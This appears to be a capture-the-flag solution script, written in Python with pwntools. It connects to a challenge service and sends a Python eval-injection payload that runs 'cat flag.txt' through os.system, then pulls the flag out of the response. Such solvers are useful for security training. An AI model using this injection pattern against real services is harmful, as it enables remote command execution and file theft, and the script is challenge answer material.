#!/usr/bin/python3
import argparse
from pwn import *

def solve(ip,port):

	conn = remote(ip,port)

	q = conn.recvline()
	payload = '__import__("os").system("cat flag.txt")'
	conn.sendline(payload)
	response = conn.recvline().decode('utf-8').split('}')[0]+'}'
	return response

def main():

	parser = argparse.ArgumentParser()
	parser.add_argument('-i','--ip',required=True,help='IP address of the challenge')
	parser.add_argument('-p','--port',required=True,help='Port of the challenge')

	args = parser.parse_args()

	ip = args.ip
	port = args.port
	flag = solve(ip,port)
	print("Flag: {}".format(flag))

if __name__ == '__main__':
	main()
